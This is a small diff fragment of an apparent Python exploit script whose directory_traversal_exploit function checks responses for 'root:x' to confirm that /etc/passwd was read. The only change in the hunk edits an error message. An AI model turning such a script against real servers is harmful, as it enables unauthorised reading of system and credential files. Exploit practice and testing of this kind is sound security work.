@@ -20,7 +20,7 @@ def directory_traversal_exploit(url):
         proxies=proxies)
     if 'root:x' in response.text:
         return response.text
-    raise ValueError("(-) Directory traversal failed")
+    raise ValueError("Directory traversal failed")
 
 if __name__ == "__main__":
     try:
